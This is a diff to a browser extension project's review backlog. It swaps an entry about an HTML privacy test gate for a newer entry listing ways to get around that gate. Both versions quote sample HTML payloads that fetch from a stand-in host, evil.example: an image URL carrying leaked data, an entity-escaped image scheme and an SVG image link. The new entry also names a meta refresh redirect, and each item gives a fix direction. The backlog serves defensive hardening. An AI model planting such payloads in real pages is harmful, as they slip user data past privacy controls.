@@ -1,24 +1,25 @@
 ## Review Backlog
 
-### Privacy gate — HTML is checked for `<script>` only, not for remote subresources
+### Privacy gate — three subresource vectors the widened HTML scan still misses
 
-- [ ] [CONSTRAINT] Raised in review on PR #41, which closed the inline-`<script>` gap. The HTML
-      half of `test/privacy/no-external-network.test.ts` reads `<script>` tags and nothing else,
-      so a remote subresource elsewhere in `src/**/*.html` passes both halves unread. Verified
-      to pass the gate today: `<img src="https://evil.example/p.gif?d=leak">`. This is not only
-      a static-analysis gap — it is live at runtime: `manifest.config.ts` sets no
-      `content_security_policy` override, so MV3's default `script-src 'self'; object-src 'self'`
-      applies and does NOT restrict `img-src`, making a remote `<img>`/`<iframe>`/`<form action>`
-      in the options page a working egress channel for anything the page can read. (An inline
-      `on*=` handler is a different case — it is inline script, so the same default CSP already
-      blocks it from executing; low priority by comparison.) `docs/conventions.md` and
-      `docs/eval-criteria.md` were narrowed in that PR to disclose this residual rather than
-      claim coverage the gate lacks. Fix direction: extend the HTML half from "`<script src` must
-      be relative in-tree" to a general remote-URL check over the URL-bearing attributes
-      (`src`, `href`, `action`, `srcset`, `poster`, `formaction`) on every tag, reusing
-      `isLocalInTreeSrc`. Decide first whether `<link href>` to a same-tree stylesheet and any
-      `data:` URI need an allowance, and whether an equivalent CSP `img-src 'self'` line in the
-      manifest is the better primary control with the gate as backup.
+- [ ] [CONSTRAINT] Found by QA attacking the widened gate on PR #42, each confirmed against
+      happy-dom as something a real parser resolves to a genuine fetch. None is a runtime hole
+      except the third — the extension-pages CSP added in that PR blocks the first two — so this
+      is about the static backup drifting from what the runtime already enforces.
+      (a) **Entity-escaped scheme.** `<img src="&#x68;ttps://evil.example/e.png">` (and the
+      decimal `&#104;`) is not flagged: `isLocalInTreeSrc` sees the raw text, whose scheme regex
+      does not match, so it reads as a relative path. This one is shared with the older
+      `<script src>` half, so it predates PR #42. Fix direction: decode numeric character
+      references before the scheme test, or reject any value containing `&#`.
+      (b) **SVG `<image>`.** `<svg><image xlink:href="https://evil.example/x.png"/></svg>` fetches
+      automatically, but `href`/`xlink:href` are only checked on `<link>`/`<base>`. Widening
+      `HREF_TAGS` to `image`/`use` is the obvious fix; check first whether any other SVG element
+      carries a fetching `href`.
+      (c) **`<meta http-equiv="refresh" content="0;url=…">`.** An automatic top-level navigation
+      carrying whatever is interpolated into the URL. Neither layer stops it: the gate does not
+      read `content=`, and Chrome dropped CSP `navigate-to`, so there is no directive to add.
+      Static-only fix, and worth stating in `docs/conventions.md` as the one vector with no
+      runtime control behind it.
 
 ### Bulk panel "Load more" — residual: a fetch slower than the dwell still truncates silently
 
